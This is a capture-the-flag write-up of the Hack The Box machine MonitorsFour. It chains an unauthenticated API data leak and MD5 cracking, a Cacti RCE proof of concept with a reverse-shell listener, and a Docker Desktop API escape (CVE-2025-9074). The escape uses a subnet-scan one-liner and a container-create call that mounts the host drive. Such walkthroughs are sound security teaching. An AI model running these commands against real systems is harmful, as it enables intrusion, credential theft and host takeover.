---
title: "HTB: MonitorsFour"
description: "A Hard box that chains an unauthenticated API leak, Cacti RCE, and a CVE-2025-9074 Docker Desktop escape to reach the host filesystem. The container escape is the highlight."
author: "Chaelsoo"
pubDate: 2026-03-02
draft: false
tags: ["htb", "linux","container-escape"]
---

MonitorsFour is a Hard box and earns it, but not through obscurity. Each step is logical and builds on the last. The Docker escape at the end is the most interesting part, built around a real CVE with a CVSS of 9.3 that was still pretty fresh when this box dropped.

## Recon

Web app at `monitorsfour.htb`. Nothing immediately obvious on the landing page, so I started fuzzing endpoints.

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -u http://monitorsfour.htb/FUZZ
```

One endpoint stood out: `/user`. It accepted a `token` parameter, which immediately looked interesting. The question was what it actually did with that token.

## IDOR: The API Leak

I threw a random string at it while fuzzing a few paths at once.

```bash
for p in user users api/user api/users profile account; do
  echo "==== $p ===="
  curl -s -i "http://monitorsfour.htb/$p?token=0e1234" | head -n 20
done
```

```
==== user ====
HTTP/1.1 200 OK
Server: nginx
Date: Mon, 02 Mar 2026 16:34:04 GMT
Content-Type: text/html; charset=UTF-8
Transfer-Encoding: chunked
Connection: keep-alive
X-Powered-By: PHP/8.3.27
Set-Cookie: PHPSESSID=470b718599daea06e19ee83640e8599c; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache

[{"id":2,"username":"admin","email":"admin@monitorsfour.htb","password":"56b32eb43e6f15395f6c46c1c9e1cd36","role":"super user","token":"8024b78f83f102da4f","name":"Marcus Higgins","position":"System Administrator","dob":"1978-04-26","start_date":"2021-01-12","salary":"320800.00"},
```

It came back with a full JSON dump of every user in the database. Names, roles, and hashed passwords. All of them, from a single unauthenticated request with a garbage token value.

This is an IDOR, Insecure Direct Object Reference. The idea is that the app is supposed to gate access to a resource based on who you are, but it either doesn't check the token at all or accepts anything you throw at it. Here it was the latter. No validation, no authentication. The endpoint just hands over the data.

The dump included four accounts. The admin hash was MD5, which hashcat chews through fast:

```bash
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt
```

Cracked: `admin:wonderful1`. Also in the dump were `mwatson`, `janderson`, and `dthompson`. Worth keeping those in mind.

`TIP:` When you find an endpoint that takes a token or ID parameter, always test it with junk values first. Proper auth should reject them. If it doesn't, you've likely found an IDOR.

## Foothold: Cacti RCE

With credentials in hand I started looking for more surface. Subdomain enumeration turned up `cacti.monitorsfour.htb`. Cacti is a network monitoring platform and a recurring guest on HTB for good reason. It has a history of nasty vulnerabilities.

Tried `marcus:wonderful1` on the login page. Got in. Password reuse pays off again.

The installed version was vulnerable to CVE-2025-24367, an authenticated RCE. The PoC is straightforward:

```bash
python3 exploit.py -url http://cacti.monitorsfour.htb -u marcus -p wonderful1 -i 10.10.14.21 -l 9001
```

Set up a listener first:

```bash
nc -lvnp 9001
```

Shell landed as `www-data`. First thing I checked: the hostname.

```bash
hostname
```

`821fbd6a43fa`. That's a container ID, not a machine name. We're inside Docker.

## Getting Out: CVE-2025-9074

Being inside a container isn't the end of the road, it's just a new problem. The goal now is to reach the host.

First thing I tried was the standard Docker socket path and the `host.docker.internal` DNS name that Docker Desktop exposes:

```bash
curl http://host.docker.internal:2375/version
```

Connection refused on IPv4, unreachable on IPv6. Dead end.

So I started thinking about what network this container is actually on. Docker Desktop on Windows runs a Linux VM under the hood to host the Docker Engine. That VM lives on a dedicated bridge network, typically `192.168.65.0/24`. The host machine sits at `192.168.65.1`, and the VM usually gets `192.168.65.7`.

CVE-2025-9074 (CVSS 9.3) is the problem here. Docker Desktop exposes the Docker Engine API on `192.168.65.7` port `2375` with no authentication. From inside any container that can reach that subnet, you have full unauthenticated access to the Docker Engine running on the VM, which means you can do anything the Docker daemon can do, including creating containers with host filesystem mounts.

A CVSS of 9.3 is rated Critical. The combination of no auth, full API access, and the ability to escape to the host filesystem is why.

First, confirm the subnet is reachable and find the right host:

```bash
for i in $(seq 1 254); do (curl -s --connect-timeout 1 http://192.168.65.$i:2375/version 2>/dev/null | grep -q "ApiVersion" && echo "192.168.65.$i:2375 OPEN") & done; wait
```

Breaking that down: it loops through every address in `192.168.65.0/24`, fires a curl at port `2375` with a one-second timeout, and checks if the response contains `ApiVersion` which is what the Docker Engine API returns on the `/version` endpoint. The `&` runs each check in the background so they all run in parallel instead of waiting one by one. `wait` at the end holds until all background jobs finish.

```
192.168.65.7:2375 OPEN
```

There it is. Let's confirm:

```bash
curl http://192.168.65.7:2375/version
```

Full API response, no auth prompt. We have the Docker daemon.

`TIP:` When you land in a Docker container on a Windows host, always check the `192.168.65.0/24` range for the Docker Desktop internal VM. It's a different attack surface from what most Linux-focused Docker escape guides cover.

## Reading the Host Flag

With unauthenticated API access, creating a container with the host filesystem mounted is just an API call. I created a new container with `C:\` bound to `/mnt/host` inside it:

```bash
curl -s -X POST http://192.168.65.7:2375/containers/create \
  -H "Content-Type: application/json" \
  -d '{
    "Image": "alpine",
    "Cmd": ["cat", "/mnt/host/Users/Administrator/Desktop/root.txt"],
    "Mounts": [{"Type": "bind", "Source": "C:\\", "Target": "/mnt/host"}],
    "HostConfig": {"Binds": ["C:\\:/mnt/host"]}
  }'
```

Start it, grab the logs, and the root flag is there.

Voila, box done.

## What Made This Interesting

The IDOR at the start was almost too easy, a completely open endpoint handing out credentials. But it was just the key to open the next door.

The Docker escape is what makes this box worth remembering. CVE-2025-9074 is dangerous precisely because it's not obvious. You'd never find it by scanning the host directly, it lives on an internal network that only exists inside Docker Desktop's architecture. The only way to reach it is from inside a container that happens to be on the right subnet, which is exactly where the Cacti RCE dropped us.

The subnet scan one-liner is a good one to keep around. It's fast, requires nothing beyond `curl`, and works from any container where bash is available.

`TIP:` The Docker API at port `2375` with no TLS is always unauthenticated. If you can reach it from anywhere, you own the Docker daemon, and through it, the host.
